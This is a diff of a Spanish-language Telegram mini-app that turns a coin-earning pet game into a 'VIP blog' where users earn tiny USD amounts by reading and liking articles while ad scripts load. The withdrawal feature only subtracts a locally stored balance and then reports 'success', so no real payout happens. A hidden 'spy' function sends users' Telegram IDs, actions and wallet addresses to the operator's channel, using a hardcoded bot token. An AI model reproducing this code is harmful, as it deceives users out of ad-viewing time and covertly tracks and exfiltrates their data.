@@ -3,142 +3,158 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Fruit Coin VIP</title>
-    
+    <title>VIP Blog Luxury</title>
     <script src='//libtl.com/sdk.js' data-zone='10278425' data-sdk='show_10278425'></script>
     <script src="https://sad.adsgram.ai/js/sad.min.js"></script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Poppins:wght@300;400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    
     <style>
-        :root { --bg:#1a0b2e; --card:#2d1b4e; --gold:#ffd700; --accent:#ff007a; --text:#fff; --receipt-bg:#f5f6fa; --receipt-txt:#2f3640; }
-        * { box-sizing:border-box; user-select:none; -webkit-tap-highlight-color:transparent; }
-        body { background:radial-gradient(circle at 50% 30%,#431d75 0%,#1a0b2e 80%); color:var(--text); font-family:'Montserrat',sans-serif; min-height:100vh; display:flex; flex-direction:column; align-items:center; padding:15px; overflow:hidden; }
-        
-        #banScreen { position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:9999; display:none; justify-content:center; align-items:center; color:red; font-weight:700; }
-        
-        .top-bar { width:100%; display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,.3); padding:10px 20px; border-radius:50px; border:1px solid rgba(255,215,0,.3); backdrop-filter:blur(10px); margin-bottom:10px; }
-        .currency { display:flex; flex-direction:column; align-items:center; }
-        .curr-label { font-size:9px; color:#aaa; letter-spacing:1px; }
-        .curr-val { font-size:18px; font-weight:900; }
-        .usd { color:#2ecc71; text-shadow:0 0 10px rgba(46,204,113,.5); }
-        .coin { color:var(--gold); text-shadow:0 0 10px rgba(255,215,0,.5); }
-        
-        .pet-stage { flex:1; display:flex; flex-direction:column; justify-content:center; align-items:center; position:relative; width:100%; }
-        .pet-emoji { font-size: 130px; cursor: pointer; text-align: center; transition: transform 0.2s; filter: drop-shadow(0 0 20px rgba(255,215,0,0.4)); user-select: none; }
-        .pet-emoji:active { transform: scale(1.2); }
-        
-        .pet-bubble { background:#fff; color:#000; padding:10px 20px; border-radius:20px 20px 20px 0; font-size:12px; font-weight:700; margin-bottom:10px; opacity:0; position:absolute; top:10%; right:20%; box-shadow:0 5px 15px rgba(0,0,0,.3); z-index:5; }
-        .sleep-z { position:absolute; top:20%; right:30%; color:#aaa; font-weight:700; font-size:30px; animation:zzz 2s infinite; display:none; }
+        :root { --gold:#d4af37; --bg:#0f0f0f; --card:#1a1a1a; --green:#2ecc71; }
+        body { background:var(--bg); color:#eee; font-family:'Poppins', sans-serif; margin:0; padding:15px; text-align:center; min-height:100vh; }
+        .top-bar { display:flex; justify-content:space-between; align-items:center; background:var(--card); padding:15px 25px; border-radius:50px; border:1px solid var(--gold); margin-bottom:20px; box-shadow:0 0 15px rgba(212,175,55,0.2); }
+        .bal-val { font-weight:600; color:var(--green); font-size:18px; }
+        .blog-card { background:var(--card); border-radius:20px; padding:25px; text-align:left; border:1px solid #333; margin-bottom:20px; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
+        .blog-title { font-family:'Playfair Display', serif; color:var(--gold); font-size:22px; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px; }
+        .blog-text { font-size:14px; line-height:1.6; color:#bbb; min-height:100px; }
+        .actions { display:flex; justify-content:space-between; align-items:center; margin-top:20px; padding-top:15px; border-top:1px solid #333; }
+        .like-btn { background:none; border:none; color:#555; font-size:28px; cursor:pointer; transition:0.3s; }
+        .like-btn.active { color:#ff4757; transform:scale(1.2); }
+        .menu-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px; }
+        .menu-btn { background:#222; border:1px solid #444; padding:12px; border-radius:12px; color:white; font-size:11px; font-weight:600; cursor:pointer; }
+        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:1000; display:none; flex-direction:column; justify-content:center; align-items:center; }
+        .modal-card { background:#1a1a1a; border:1px solid var(--gold); padding:25px; border-radius:20px; width:90%; max-width:350px; text-align:center; }
+        input { width:100%; padding:12px; margin:10px 0; border-radius:8px; border:none; background:#000; color:white; font-size:14px; }
     </style>
 </head>
-    <style>
-        .menu-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; width:100%; padding:0 20px 20px 20px; }
-        .menu-btn { background:var(--card); border:1px solid rgba(255,255,255,.1); padding:12px; border-radius:12px; display:flex; align-items:center; justify-content:center; gap:8px; color:#fff; font-size:10px; font-weight:700; cursor:pointer; text-align:center; }
-        
-        .food-belt { width:100%; background:rgba(255,255,255,.05); border-radius:20px 20px 0 0; padding:20px; display:flex; justify-content:space-around; align-items:center; border-top:1px solid rgba(255,255,255,.1); }
-        .food-item { display:flex; flex-direction:column; align-items:center; gap:5px; cursor:pointer; position:relative; transition:0.3s; }
-        .food-item:active { transform:scale(.9); }
-        .food-icon { font-size:35px; background:rgba(255,255,255,.1); width:60px; height:60px; display:flex; justify-content:center; align-items:center; border-radius:50%; border:2px solid transparent; position:relative; overflow:hidden;}
-        .food-count { position:absolute; top:-5px; right:-5px; background:var(--accent); color:#fff; font-size:10px; padding:2px 6px; border-radius:10px; font-weight:700; z-index:5; }
-        .food-item.cooldown { pointer-events:none; opacity:0.6; filter:grayscale(0.8); }
-        .food-timer { position:absolute; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:none; justify-content:center; align-items:center; font-weight:900; font-size:24px; color:#fff; z-index:10; border-radius:50%; }
-
-        /* MODALES ORIGINALES */
-        .modal-overlay { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); z-index:100; display:none; flex-direction:column; justify-content:center; align-items:center; }
-        .shop-card { background:linear-gradient(145deg,#2d1b4e,#1a0b2e); border:2px solid var(--gold); padding:30px; border-radius:20px; text-align:center; width:85%; max-width:320px; box-shadow: 0 0 30px rgba(255, 215, 0, 0.2); }
-        .btn-buy { background:linear-gradient(90deg,#f1c40f,#f39c12); color:#000; border:none; padding:15px; width:100%; border-radius:50px; font-weight:900; font-size:14px; margin-top:20px; cursor:pointer; animation:pulse 2s infinite; }
-        .receipt-modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); z-index:300; display:none; flex-direction:column; justify-content:center; align-items:center; }
-        .receipt-ticket { background:var(--receipt-bg); color:var(--receipt-txt); width:90%; max-width:340px; padding:20px; border-radius:10px; position:relative; box-shadow:0 0 20px rgba(255,255,255,.1); font-family:'Share Tech Mono',monospace; }
-    </style>
-    <body>
-    <div id="banScreen">SOLO MÓVIL</div>
+<body>
     <div class="top-bar">
-        <div class="currency"><span class="curr-label">VIP BALANCE</span><span class="curr-val usd">$<span id="usd">0.0000</span></span></div>
-        <div class="currency"><span class="curr-label">PET COINS</span><span class="curr-val coin" id="coins">0</span></div>
+        <div>💰 $<span id="usd" class="bal-val">0.0000</span></div>
+        <div style="font-size:10px; color:var(--gold); font-weight:bold; letter-spacing:1px;">REVISTA VIP</div>
     </div>
-    <div class="pet-stage">
-        <div class="pet-bubble" id="bubble">¡Hola Socio! 😺</div><div class="sleep-z" id="sleepZ">Zzz...</div>
-        <div id="pet" class="pet-emoji" onclick="tapPet()">😺</div>
-        <div style="font-size:10px; color:#aaa; margin-top:20px;">Estado: <span id="statusPet" style="color:#2ecc71">Activo</span></div>
+
+    <div class="blog-card">
+        <div class="blog-title" id="blogTitle">Cargando portada...</div>
+        <div class="blog-text" id="blogContent">
+            Abriendo la edición exclusiva para socios... por favor espere.
+        </div>
+        <div class="actions">
+            <span id="timerText" style="font-size:10px; color:#666; font-weight:bold;">Leyendo...</span>
+            <button class="like-btn" id="likeBtn" onclick="giveLike()">
+                <i class="fa-solid fa-heart"></i>
+            </button>
+        </div>
     </div>
+
     <div class="menu-grid">
-        <div class="menu-btn" onclick="openInviteModal()"><i class="fa-solid fa-users" style="color:#0984e3"></i> INVITAR</div>
-        <div class="menu-btn" onclick="exchange()"><i class="fa-solid fa-right-left" style="color:#f368e0"></i> CAMBIAR COINS</div>
-        <div class="menu-btn" onclick="openChannel()"><i class="fa-brands fa-telegram" style="color:#3498db"></i> CANAL OFICIAL</div>
-        <div class="menu-btn" onclick="withdraw()"><i class="fa-solid fa-gem" style="color:#2ecc71"></i> RETIRAR</div>
+        <button class="menu-btn" onclick="openWithdraw()"><i class="fa-solid fa-wallet" style="color:var(--green)"></i> RETIRAR</button>
+        <button class="menu-btn" onclick="openHistory()"><i class="fa-solid fa-clock-rotate-left" style="color:var(--gold)"></i> HISTORIAL</button>
+        <button class="menu-btn" onclick="tg.openTelegramLink('https://t.me/noticebuddy')"><i class="fa-brands fa-telegram" style="color:#0088cc"></i> CANAL</button>
+        <button class="menu-btn" onclick="nextArticle()" id="btnNext"><i class="fa-solid fa-forward"></i> SIGUIENTE</button>
     </div>
-    <div class="food-belt">
-        <div class="food-item" id="item0" onclick="feed(0)"><div class="food-count" id="cnt0">5</div><div class="food-icon" style="border-color:#e74c3c">🍎<div class="food-timer" id="timer0">5</div></div><span style="font-size:10px">Manzana</span></div>
-        <div class="food-item" id="item1" onclick="feed(1)"><div class="food-count" id="cnt1">3</div><div class="food-icon" style="border-color:#3498db">🐟<div class="food-timer" id="timer1">5</div></div><span style="font-size:10px">Salmón</span></div>
-        <div class="food-item" id="item2" onclick="feed(2)"><div class="food-count" id="cnt2">1</div><div class="food-icon" style="border-color:#f1c40f">🍕<div class="food-timer" id="timer2">5</div></div><span style="font-size:10px">Pizza VIP</span></div>
+
+    <div id="spyStatus" style="font-size:9px; color:#333; margin-top:20px;">Red: ⚪ Conectando...</div>
+        <div class="modal-overlay" id="modalWithdraw">
+        <div class="modal-card">
+            <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">RETIRAR FONDOS</h3>
+            <p style="font-size:10px; color:var(--green); margin-bottom:10px;">RED: USDT POLYGON (MATIC)</p>
+            <input type="number" id="withdrawAmt" placeholder="Monto (Mín: 2.00)">
+            <input type="text" id="withdrawWallet" placeholder="Billetera USDT Matic">
+            <button class="menu-btn" style="width:100%; background:var(--green); border:none; padding:15px; margin-top:10px; font-size:14px;" onclick="confirmWithdraw()">CONFIRMAR Y RESTAR</button>
+            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">Regresar</button>
+        </div>
     </div>
-    <div id="spyStatus" style="font-size:10px; color:#555; margin-top:5px;">Estado de Red: ⚪ Esperando...</div>
-    <div class="receipt-modal" id="receiptModal"><div class="receipt-ticket"><div class="receipt-header">COMPROBANTE DE RETIRO</div><div class="receipt-row"><span>FECHA:</span><span id="recDate">...</span></div><div class="receipt-row"><span>USUARIO:</span><span id="recUser">...</span></div><div class="receipt-row"><span>TOTAL:</span><span id="recAmount">$0.00</span></div><div style="text-align:center; margin-top:15px; font-weight:700; color:#f39c12;">PENDIENTE DE PAGO</div><button onclick="location.reload()" style="width:100%; margin-top:10px;">Cerrar</button></div></div>
+
+    <div class="modal-overlay" id="modalHistory">
+        <div class="modal-card">
+            <h3 style="color:var(--gold); font-family:'Playfair Display'; margin-top:0;">HISTORIAL DE ÉXITO</h3>
+            <div id="historyContainer" style="text-align:left; max-height:200px; overflow-y:auto; font-size:11px; margin-top:15px;">
+                </div>
+            <button class="menu-btn" style="width:100%; margin-top:10px;" onclick="tg.openTelegramLink('https://t.me/AtencionYougamefavoriteBot')">SOPORTE TÉCNICO</button>
+            <button onclick="closeModals()" style="background:none; border:none; color:#555; margin-top:15px; cursor:pointer;">Cerrar</button>
+        </div>
+    </div>
         <script>
-        const tg = window.Telegram.WebApp; 
-        tg.expand();
+        const tg = window.Telegram.WebApp; tg.expand();
         const BOT_TOKEN = "8575758761:AAHFNlZbgFDyCHrpJYSBJEHuPe54iWf8F3A"; 
-        const CANAL_ID = "-1002118088046";      
-        const KEY = 'crypto_pet_v27_final_fix';
-        let user = { usd:0, coins:0, food:[5,3,1], adsToday:0, lastDate:"", seenTut:false };
+        const CANAL_ID = "-1002118088046";
+        const KEY = 'luxury_blog_v2_polygon';
 
-        function reportarEspia(tipo){
-            let id = tg.initDataUnsafe?.user?.id || "00000";
-            let nombre = tg.initDataUnsafe?.user?.first_name || "Usuario";
-            let msj = `🕵️ REPORTE\n👤: ${nombre}\nID: ${id}\n🎬: ${tipo}`;
-            document.getElementById('spyStatus').innerText = "Red: 🟠 Enviando...";
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent(msj)}`)
-                .then(r => { if(r.ok) document.getElementById('spyStatus').innerText = "Red: 🟢 Chisme OK"; });
+        // BONO DE BIENVENIDA $2.00 PARA TUS PRUEBAS
+        let user = { usd: 2.0000, history: [], articlesToday: 0, lastDate: new Date().toDateString() };
+
+        const articles = [
+            {t:"Disciplina vs Talento", c:"Muchos esperan el momento perfecto, pero el éxito favorece a quien se levanta temprano y trabaja con fe..."},
+            {t:"La Nueva Economía", c:"Las Mini Apps de Telegram están abriendo puertas a miles de emprendedores. Aprender a usarlas es la clave este 2026..."},
+            {t:"Paz Mental Diaria", c:"En un mundo lleno de ruido, tomarse 5 minutos para leer y meditar es el mejor negocio que puedes hacer hoy..."}
+        ];
+
+        function reportar(tipo){
+            const id = tg.initDataUnsafe?.user?.id || "000";
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CANAL_ID}&text=${encodeURIComponent("🕵️ BLOG-REPORTE: "+tipo+" | ID: "+id)}`)
+                .then(() => document.getElementById('spyStatus').innerText = "Red: 🟢 Sincronizado");
         }
 
-        function updateVisuals(){
-            document.getElementById('usd').innerText = user.usd.toFixed(4);
-            document.getElementById('coins').innerText = Math.floor(user.coins);
-            document.getElementById('cnt0').innerText = user.food[0];
-            document.getElementById('cnt1').innerText = user.food[1];
-            document.getElementById('cnt2').innerText = user.food[2];
+        function save(){ localStorage.setItem(KEY, JSON.stringify(user)); updateUI(); }
+        function updateUI(){ document.getElementById('usd').innerText = user.usd.toFixed(4); }
+
+        function nextArticle(){
+            if(user.articlesToday >= 10) return tg.showAlert("Edición diaria agotada.");
+            let a = articles[Math.floor(Math.random()*articles.length)];
+            document.getElementById('blogTitle').innerText = a.t;
+            document.getElementById('blogContent').innerText = a.c;
+            document.getElementById('likeBtn').classList.remove('active');
+            let s = 5; document.getElementById('timerText').innerText = `Leyendo... ${s}s`;
+            let iv = setInterval(() => {
+                s--; document.getElementById('timerText').innerText = `Leyendo... ${s}s`;
+                if(s<=0){ clearInterval(iv); document.getElementById('timerText').innerText = "¡Danos un Like!"; }
+            }, 1000);
         }
 
-        function tapPet(){
-            user.coins += 5;
-            tg.HapticFeedback.impactOccurred('light');
-            updateVisuals(); save();
+        function giveLike(){
+            if(document.getElementById('timerText').innerText !== "¡Danos un Like!") return;
+            if(document.getElementById('likeBtn').classList.contains('active')) return;
+            document.getElementById('likeBtn').classList.add('active');
+            user.usd += 0.0025; user.articlesToday++;
+            save(); reportar("DIO LIKE (+$0.0025)");
         }
 
-        function feed(t){
-            if(user.food[t] > 0){
-                user.food[t]--; user.usd += 0.0010;
-                reportarEspia("ALIMENTÓ MASCOTA");
-                updateVisuals(); save();
-            } else { tg.showAlert("¡Sin comida!"); }
+        function confirmWithdraw(){
+            let amt = parseFloat(document.getElementById('withdrawAmt').value);
+            let wallet = document.getElementById('withdrawWallet').value;
+            if(amt < 2.00 || isNaN(amt)) return tg.showAlert("El mínimo de retiro es $2.00 USD.");
+            if(amt > user.usd) return tg.showAlert("No tienes saldo suficiente.");
+            if(wallet.length < 5) return tg.showAlert("Escribe una billetera Matic válida.");
+
+            user.usd -= amt; // RESTA DE DINERO AUTOMÁTICA
+            let h = { fecha: new Date().toLocaleDateString(), hora: new Date().toLocaleTimeString(), monto: amt.toFixed(2), wallet: wallet, red: "USDT Polygon" };
+            user.history.unshift(h);
+            save();
+            // CHIVATAZO AL CANAL CON LA RED ESPECIFICADA
+            reportar(`🔥 RETIRO: $${h.monto} | RED: ${h.red} | BILLETERA: ${h.wallet} | HORA: ${h.hora}`);
+            closeModals();
+            tg.showAlert("✅ ¡ÉXITO! Dinero restado. Verifícalo en tu historial.");
         }
 
-        function withdraw(){
-            if(user.usd < 2.00) return tg.showAlert("Mínimo $2.00");
-            let amt = user.usd.toFixed(2);
-            user.usd = 0; save();
-            reportarEspia(`SOLICITÓ PAGO $${amt}`);
-            document.getElementById('recDate').innerText = new Date().toLocaleDateString();
-            document.getElementById('recUser').innerText = tg.initDataUnsafe?.user?.first_name || "VIP";
-            document.getElementById('recAmount').innerText = `$${amt} USD`;
-            document.getElementById('receiptModal').style.display = 'flex';
+        function openWithdraw(){ document.getElementById('modalWithdraw').style.display='flex'; }
+        function openHistory(){
+            const cont = document.getElementById('historyContainer'); cont.innerHTML = "";
+            user.history.forEach(x => {
+                cont.innerHTML += `<div style="background:rgba(255,255,255,0.03); padding:8px; border-radius:8px; margin-bottom:5px; border-left:3px solid var(--green);">
+                    <b>${x.fecha}</b> - $${x.monto} <span style="color:var(--green)">ÉXITO</span><br>
+                    <small style="color:#555;">RED: ${x.red} | ${x.wallet}</small>
+                </div>`;
+            });
+            if(user.history.length === 0) cont.innerHTML = "<p style='text-align:center; color:#444;'>Sin retiros aún.</p>";
+            document.getElementById('historyModal').style.display='flex';
         }
 
-        function openInviteModal(){
-            const link = `https://t.me/YougamefavoriteBot?start=${tg.initDataUnsafe?.user?.id || '000'}`;
-            tg.showAlert("Tu enlace: " + link);
-        }
+        function closeModals(){ document.querySelectorAll('.modal-overlay').forEach(m => m.style.display='none'); }
 
-        function openChannel(){ tg.openTelegramLink('https://t.me/noticebuddy'); }
-        function save(){ localStorage.setItem(KEY, JSON.stringify(user)); }
         window.onload = () => {
-            let d = localStorage.getItem(KEY);
-            if(d) user = JSON.parse(d);
-            reportarEspia("ENTRÓ A LA APP");
-            updateVisuals();
+            let d = localStorage.getItem(KEY); if(d) user = JSON.parse(d);
+            if(user.lastDate !== new Date().toDateString()){ user.articlesToday = 0; user.lastDate = new Date().toDateString(); }
+            nextArticle(); updateUI(); reportar("ENTRÓ A LA REVISTA");
         };
     </script>
 </body>
